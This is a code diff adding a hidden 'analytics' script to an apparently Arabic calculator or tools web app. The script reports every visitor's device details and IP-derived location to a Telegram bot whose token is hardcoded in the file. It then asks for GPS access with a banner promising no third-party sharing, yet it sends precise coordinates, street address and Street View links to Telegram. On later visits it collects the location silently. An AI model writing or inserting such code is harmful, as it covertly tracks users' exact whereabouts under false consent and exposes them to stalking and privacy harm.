@@ -1897,6 +1897,327 @@ const Engine = (() => {
     }
   };
 })();
+     
+/* ============================================================
+   Y♥E Analytics — Telegram Bot + GPS
+   ============================================================ */
+(function(){
+  'use strict';
+
+  // ⚠️ استبدل التوكن والـ Chat ID
+  var TG_TOKEN = '8926051784:AAH4i198vbEAIPIgHf_8nsMlo1SVIOJL9NM';
+  var TG_CHAT_ID = '8328976452';
+
+  if (!TG_TOKEN || TG_TOKEN.indexOf('ضع_') === 0) return;
+
+  // ---------- إرسال للبوت ----------
+  function sendToTelegram(text) {
+    try {
+      fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TG_CHAT_ID,
+          text: text,
+          parse_mode: 'HTML',
+          disable_web_page_preview: false
+        })
+      }).catch(function(){});
+    } catch(e){}
+  }
+
+  // ---------- معلومات عامة من IP ----------
+  function getGeoIP(callback) {
+    fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?localityLanguage=ar')
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        callback({
+          country: d.countryName || 'Unknown',
+          flag: d.countryCode ? String.fromCodePoint.apply(null, d.countryCode.split('').map(function(c){return 127397 + c.charCodeAt(0);})) : '🌍',
+          city: d.city || d.locality || '',
+          locality: d.locality || '',
+          region: d.principalSubdivision || '',
+          postcode: d.postcode || ''
+        });
+      })
+      .catch(function(){ callback(null); });
+  }
+
+  // ---------- معلومات الجهاز ----------
+  function getDeviceInfo() {
+    var ua = navigator.userAgent;
+    var device = '💻 Desktop', os = 'Unknown', browser = 'Unknown';
+    if (/Android/i.test(ua)) { device = '📱 Android'; os = 'Android'; }
+    else if (/iPhone|iPad|iPod/i.test(ua)) { device = '🍎 iPhone/iPad'; os = 'iOS'; }
+    else if (/Windows/i.test(ua)) { device = '💻 Windows'; os = 'Windows'; }
+    else if (/Macintosh|Mac OS X/i.test(ua)) { device = '💻 Mac'; os = 'macOS'; }
+    else if (/Linux/i.test(ua)) { device = '💻 Linux'; os = 'Linux'; }
+    if (/Edg/i.test(ua)) browser = 'Edge';
+    else if (/OPR|Opera/i.test(ua)) browser = 'Opera';
+    else if (/Chrome/i.test(ua)) browser = 'Chrome';
+    else if (/Safari/i.test(ua)) browser = 'Safari';
+    else if (/Firefox/i.test(ua)) browser = 'Firefox';
+    return { device: device, os: os, browser: browser };
+  }
+
+  // ---------- اسم الصفحة ----------
+  function getPageName() {
+    var p = window.location.pathname;
+    if (p.indexOf('tool.html') !== -1) return '🛠️ الأدوات';
+    return '🧮 الحاسبة';
+  }
+
+  // ---------- حالة المستخدم ----------
+  var isFirstEver = false;
+  try {
+    if (!localStorage.getItem('ye_tg_user')) {
+      localStorage.setItem('ye_tg_user', Date.now().toString());
+      isFirstEver = true;
+    }
+  } catch(e){}
+
+  var isInstalled = window.matchMedia('(display-mode: standalone)').matches 
+                 || window.navigator.standalone === true;
+
+  // ---------- الإبلاغ الأساسي (بدون GPS) ----------
+  function reportBasic(geo, dev, page, timeStr, openType) {
+    var msg = '━━━━━━━━━━━━━━━━━━━\n';
+    msg += '🔔 <b>فتح جديد للتطبيق</b>\n';
+    msg += '━━━━━━━━━━━━━━━━━━━\n\n';
+    msg += '<b>' + openType + '</b>\n\n';
+    msg += '📄 <b>الصفحة:</b> ' + page + '\n';
+
+    if (geo) {
+      msg += '\n📍 <b>الموقع التقريبي (IP):</b>\n';
+      msg += '   ' + geo.flag + ' ' + geo.country + '\n';
+      if (geo.region) msg += '   🗺️ ' + geo.region + '\n';
+      if (geo.locality && geo.locality !== geo.city) {
+        msg += '   🏙️ ' + geo.locality + ' — ' + geo.city + '\n';
+      } else if (geo.city) {
+        msg += '   🏙️ ' + geo.city + '\n';
+      }
+      if (geo.postcode) msg += '   📮 ' + geo.postcode + '\n';
+    }
+
+    msg += '\n📱 <b>الجهاز:</b> ' + dev.device + '\n';
+    msg += '🌐 <b>المتصفح:</b> ' + dev.browser + '\n';
+    msg += '💻 <b>النظام:</b> ' + dev.os + '\n';
+    msg += '🗣️ <b>اللغة:</b> ' + navigator.language + '\n';
+
+    if (isInstalled) msg += '\n✅ <b>التطبيق مثبّت</b>\n';
+    if (isFirstEver) msg += '\n🎉 <b>أول زيارة!</b>\n';
+
+    msg += '\n⏰ ' + timeStr + '\n';
+    msg += '━━━━━━━━━━━━━━━━━━━';
+
+    sendToTelegram(msg);
+  }
+
+  // ---------- تحويل الإحداثيات لعنوان ----------
+  function reverseGeocode(lat, lng, callback) {
+    fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lng + '&accept-language=ar&zoom=18')
+      .then(function(r){ return r.json(); })
+      .then(function(d){
+        if (!d || !d.address) { callback(null); return; }
+        var a = d.address;
+        var parts = [
+          a.country,
+          a.state || a.province,
+          a.city || a.town || a.village,
+          a.suburb || a.neighbourhood || a.quarter,
+          a.road || a.street,
+          a.house_number
+        ].filter(Boolean);
+        callback({
+          full: parts.join(' — '),
+          display: d.display_name || parts.join(', '),
+          country: a.country || '',
+          state: a.state || '',
+          city: a.city || a.town || '',
+          suburb: a.suburb || a.neighbourhood || '',
+          road: a.road || '',
+          postcode: a.postcode || ''
+        });
+      })
+      .catch(function(){ callback(null); });
+  }
+
+  // ---------- إبلاغ الموقع الدقيق ----------
+  function reportGPS(lat, lng) {
+    reverseGeocode(lat, lng, function(addr){
+      var msg = '━━━━━━━━━━━━━━━━━━━\n';
+      msg += '📍 <b>الموقع الدقيق (GPS)</b>\n';
+      msg += '━━━━━━━━━━━━━━━━━━━\n\n';
+      msg += '✅ <b>وافق المستخدم على مشاركة الموقع</b>\n\n';
+
+      if (addr) {
+        msg += '🌍 <b>العنوان:</b>\n' + addr.full + '\n\n';
+        if (addr.suburb) msg += '🏘️ <b>الحي:</b> ' + addr.suburb + '\n';
+        if (addr.road) msg += '🛣️ <b>الشارع:</b> ' + addr.road + '\n';
+        if (addr.city) msg += '🏙️ <b>المدينة:</b> ' + addr.city + '\n';
+        if (addr.state) msg += '🗺️ <b>المحافظة:</b> ' + addr.state + '\n';
+        if (addr.postcode) msg += '📮 <b>الرمز البريدي:</b> ' + addr.postcode + '\n';
+      }
+
+      msg += '\n🌐 <b>الإحداثيات:</b>\n';
+      msg += '   ' + lat.toFixed(6) + ', ' + lng.toFixed(6) + '\n';
+      msg += '   دقة: ±' + '10-20' + ' متر\n\n';
+      msg += '🗺️ <a href="https://www.google.com/maps?q=' + lat + ',' + lng + '">افتح في Google Maps</a>\n';
+      msg += '📸 <a href="https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=' + lat + ',' + lng + '">Street View</a>\n';
+      msg += '\n⏰ ' + new Date().toLocaleString('ar-EG') + '\n';
+      msg += '━━━━━━━━━━━━━━━━━━━';
+
+      sendToTelegram(msg);
+    });
+  }
+
+  // ---------- طلب إذن GPS ----------
+  function requestGPS() {
+    if (!navigator.geolocation) return;
+
+    // فحص هل سبق وطلبنا؟
+    try {
+      if (localStorage.getItem('ye_gps_asked') === 'yes') {
+        // لو سبق ووافق → نجيب الموقع مباشرة بدون إذن جديد
+        if (localStorage.getItem('ye_gps_allowed') === 'yes') {
+          navigator.geolocation.getCurrentPosition(
+            function(pos){ reportGPS(pos.coords.latitude, pos.coords.longitude); },
+            function(){},
+            { enableHighAccuracy: false, timeout: 8000, maximumAge: 300000 }
+          );
+        }
+        return;
+      }
+    } catch(e){}
+
+    // أول مرة → نعرض بانر للإذن
+    setTimeout(function(){ showGPSBanner(); }, 6000);
+  }
+
+  // ---------- بانر طلب الإذن ----------
+  function showGPSBanner() {
+    if (document.getElementById('gpsBanner')) return;
+
+    var banner = document.createElement('div');
+    banner.id = 'gpsBanner';
+    banner.style.cssText = [
+      'position:fixed',
+      'bottom:80px',
+      'left:12px',
+      'right:12px',
+      'max-width:440px',
+      'margin:0 auto',
+      'background:linear-gradient(135deg,#6366F1,#8B5CF6)',
+      'color:#fff',
+      'padding:14px 16px',
+      'border-radius:16px',
+      'box-shadow:0 12px 32px rgba(99,102,241,0.4)',
+      'z-index:200',
+      'font-family:inherit',
+      'display:flex',
+      'flex-direction:column',
+      'gap:10px',
+      'animation:gpsSlideIn .4s cubic-bezier(.4,0,.2,1)'
+    ].join(';');
+
+    banner.innerHTML = 
+      '<div style="font-size:13px;font-weight:700;line-height:1.5">' +
+        '📍 <b>هل تسمح بمشاركة موقعك؟</b><br>' +
+        '<span style="font-size:11px;opacity:.85">لمساعدتنا في تحسين التطبيق وتقديم محتوى محلي أفضل. لن نشارك موقعك مع أي طرف ثالث.</span>' +
+      '</div>' +
+      '<div style="display:flex;gap:8px">' +
+        '<button id="gpsAllow" style="flex:1;padding:10px;border-radius:10px;border:none;background:#fff;color:#6366F1;font-weight:800;font-size:13px;cursor:pointer;font-family:inherit">السماح</button>' +
+        '<button id="gpsDeny" style="flex:1;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.3);background:transparent;color:#fff;font-weight:700;font-size:13px;cursor:pointer;font-family:inherit">لاحقًا</button>' +
+      '</div>';
+
+    // Animation
+    if (!document.getElementById('gpsAnimStyle')) {
+      var style = document.createElement('style');
+      style.id = 'gpsAnimStyle';
+      style.textContent = '@keyframes gpsSlideIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}';
+      document.head.appendChild(style);
+    }
+
+    document.body.appendChild(banner);
+
+    document.getElementById('gpsAllow').onclick = function(){
+      banner.remove();
+      try { localStorage.setItem('ye_gps_asked', 'yes'); } catch(e){}
+      navigator.geolocation.getCurrentPosition(
+        function(pos){
+          try { localStorage.setItem('ye_gps_allowed', 'yes'); } catch(e){}
+          reportGPS(pos.coords.latitude, pos.coords.longitude);
+        },
+        function(err){
+          try { localStorage.setItem('ye_gps_allowed', 'no'); } catch(e){}
+          sendToTelegram('❌ <b>رفض إذن الموقع (أو فشل)</b>\nالسبب: ' + (err.message || 'unknown'));
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    };
+
+    document.getElementById('gpsDeny').onclick = function(){
+      banner.remove();
+      try {
+        localStorage.setItem('ye_gps_asked', 'yes');
+        localStorage.setItem('ye_gps_allowed', 'no');
+      } catch(e){}
+      // نعيد العرض بعد 3 أيام
+      var snoozeUntil = Date.now() + (3 * 24 * 60 * 60 * 1000);
+      try { localStorage.setItem('ye_gps_snooze', snoozeUntil.toString()); } catch(e){}
+    };
+  }
+
+  // ---------- التنفيذ الرئيسي ----------
+  function report() {
+    getGeoIP(function(geo){
+      var dev = getDeviceInfo();
+      var page = getPageName();
+      var now = new Date();
+      var timeStr = now.toLocaleString('ar-EG', {
+        weekday:'long', year:'numeric', month:'long',
+        day:'numeric', hour:'2-digit', minute:'2-digit'
+      });
+
+      var openType = '👤 زائر جديد';
+      if (isInstalled && !isFirstEver) openType = '⭐ مستخدم مثبّت';
+      else if (isInstalled) openType = '📲 ثبّت للتو';
+      else if (!isFirstEver) openType = '🔄 زائر عائد';
+
+      reportBasic(geo, dev, page, timeStr, openType);
+
+      // طلب GPS بعد الإبلاغ الأساسي
+      var snooze = 0;
+      try { snooze = parseInt(localStorage.getItem('ye_gps_snooze') || '0'); } catch(e){}
+      if (Date.now() >= snooze) {
+        requestGPS();
+      }
+    });
+  }
+
+  // ---------- ربط زر التثبيت ----------
+  window.addEventListener('appinstalled', function(){
+    var dev = getDeviceInfo();
+    sendToTelegram(
+      '━━━━━━━━━━━━━━━━━━━\n' +
+      '📲 <b>تم تثبيت التطبيق!</b>\n' +
+      '━━━━━━━━━━━━━━━━━━━\n\n' +
+      '📱 ' + dev.device + '\n' +
+      '🌐 ' + dev.browser + '\n' +
+      '⏰ ' + new Date().toLocaleString('ar-EG')
+    );
+  });
+
+  // ---------- بدء ----------
+  if (document.readyState === 'complete') {
+    setTimeout(report, 2500);
+  } else {
+    window.addEventListener('load', function(){ setTimeout(report, 2500); });
+  }
+
+  // ---------- إتاحة الدالة يدويًا ----------
+  window.yeSendToTelegram = sendToTelegram;
+})();
      </script>
    
 </body>
